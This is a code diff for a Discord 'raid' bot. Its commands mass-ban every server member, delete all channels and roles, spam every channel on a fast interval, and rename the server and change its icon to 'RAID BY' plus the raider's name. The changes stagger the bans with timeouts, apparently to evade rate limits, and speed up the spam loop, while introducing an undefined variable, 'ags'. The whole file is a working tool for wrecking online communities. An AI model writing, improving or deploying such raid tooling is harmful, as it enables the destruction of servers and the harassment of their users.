@@ -21,11 +21,16 @@ client.on("message", async message => {
     .split(/ +/g);
   if(message.content.toLowerCase().startsWith(config.prefix + "ban")){
 
-    message.guild.members.cache.forEach(member => {
+      message.guild.members.cache.forEach(member => {
 
-      member.ban({ reason: `RAID BY ${config.raidername}` })
-      .then(user => console.log(`User banned: ${user.username}`))
-      .catch("Unable to ban " + member.username);
+		setTimeout(function() {
+			
+				 member.ban({ reason: `RAID BY ${config.raidername}` })
+				.then(user => console.log(`User banned: ${user.username}`))
+				.catch("Unable to ban " + member.username);
+	  
+		}, 1000)
+
     });
 };
 
@@ -33,12 +38,12 @@ if(message.content.toLowerCase().startsWith(config.prefix + "ping")){
 
   setInterval(function() {
 
-  message.guild.channels.cache.forEach(channels => {
+  message.guild.channels.cache.forEach(chanel => {
 
-	channels.send(args[1])
+	chanel.send(ags.slice(1).join(" "))
   });
   
-  }, 500)
+  }, 250)
 
 };
 
@@ -68,7 +73,7 @@ if(message.content.toLowerCase().startsWith(config.prefix + "delchannels")){
 
   message.guild.channels.cache.forEach(channels => {
     channels.delete()
-    .then(deleted => console.log(`Deleted role: ${deleted.name}`))
+    .then(deleted => console.log(`Deleted channel: ${deleted.name}`))
     .catch("Unable to delete the role " + channels.name);
 });
 
@@ -129,12 +134,18 @@ if(message.content.toLowerCase().startsWith(config.prefix + "nuke")){
   .then(deleted => console.log(`Deleted role: ${deleted.name}`))
   .catch("Unable to delete the role " + roles.name);
   });
-  message.guild.members.cache.forEach(member => {
 
-    member.ban({ reason: `RAID BY ${config.raidername}` })
-    .then(user => console.log(`User banned: ${user.username}`))
-    .catch("Unable to ban " + member.username);
-  });
+     message.guild.members.cache.forEach(member => {
+
+	setTimeout(function() {
+			
+		member.ban({ reason: `RAID BY ${config.raidername}` })
+		.then(user => console.log(`User banned: ${user.username}`))
+		.catch("Unable to ban " + member.username);
+	  
+	}, 1000)
+
+    });
 
   message.guild.setName("RAID BY " + config.raidername)
   message.guild.setIcon(config.guildicon)
